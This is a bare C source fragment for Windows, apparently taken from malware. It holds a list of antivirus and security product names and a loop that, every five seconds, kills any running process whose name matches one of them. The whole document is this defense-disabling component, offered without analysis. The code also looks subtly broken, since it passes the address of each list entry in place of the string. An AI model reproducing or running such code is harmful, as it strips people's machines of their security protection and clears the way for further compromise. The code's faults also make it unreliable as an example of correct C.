const char *AntiVirus[] = {"av","AV","Av","Sophos","SOPHOS","sophos","KASPERSKY","Kaspersky","kaspersky",
"Virus","VIRUS","virus","Malware","MALWARE","malware","Zoner","ZONER","zoner","NORTON","Norton","norton",
"Anti","ANTI","anti","Scan","SCAN","scan","NOD32","nod32","Nod32","f-","F-","Dr.","DR.","dr.","SECUR","secur",
"Secur","Defen","DEFEN","defen","Mcafee","MCAFEE","mcafee",0};

int SearchNDestroy(char *string);
int AntiVirusTerminate(void)
{
	int i;
	while(1) {
		for(i = 0; AntiVirus[i]; i++) SearchNDestroy((char *)&AntiVirus[i]);
		Sleep(5000);
	}
}
int SearchNDestroy(char *string)
{
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0), pHandle;
	PROCESSENTRY32 pe32;

	Process32First(hSnapshot,&pe32);
	pHandle = OpenProcess(PROCESS_ALL_ACCESS,TRUE,pe32.th32ProcessID);
	if(strstr(pe32.szExeFile,string)!=NULL) TerminateProcess(pHandle,0);
	CloseHandle(pHandle);

	while(Process32Next(hSnapshot,&pe32) == TRUE) {
		pHandle = OpenProcess(PROCESS_ALL_ACCESS,TRUE,pe32.th32ProcessID);
		if(strstr(pe32.szExeFile,string)!=NULL) TerminateProcess(pHandle,0);
		CloseHandle(pHandle);
	}
}
